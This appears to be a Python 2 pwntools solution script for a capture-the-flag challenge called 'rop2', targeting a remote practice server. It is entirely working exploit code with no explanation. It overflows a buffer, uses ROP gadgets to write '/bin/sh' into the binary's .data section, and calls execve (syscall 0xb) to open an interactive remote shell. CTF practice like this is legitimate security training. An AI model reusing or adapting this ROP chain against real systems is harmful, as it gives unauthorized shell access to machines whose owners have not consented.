#!/usr/bin/env python2
from pwn import *
import pwnlib.elf
e = ELF('rop2')

# init
c = remote('hackme.inndy.tw', 7703)
context.os='linux'
context.arch='x86'

ans = '\0' * (0xc + 4)

# /bin
ans += p32(0x804843e) # pop eax ; pop edx ; pop ecx ; ret
ans += p32(e.get_section_by_name('.data').header.sh_addr)
ans += p32(0x0)
ans += p32(0x0)
ans += p32(0x804844e) # pop dword ptr [eax] ; ret
ans += '/bin'

# /bin/sh
ans += p32(0x804843e) # pop eax ; pop edx ; pop ecx ; ret
ans += p32(e.get_section_by_name('.data').header.sh_addr + 4)
ans += p32(0x8048320)
ans += p32(0x0)
ans += p32(0x804844e) # pop dword ptr [eax] ; ret
ans += '/sh\0'

# call
ans += p32(0x80483dd) # call edx
ans += p32(0xb)
ans += p32(e.get_section_by_name('.data').header.sh_addr)
ans += p32(0x0)
ans += p32(0x0)

c.sendline(ans)

c.interactive()
c.close()
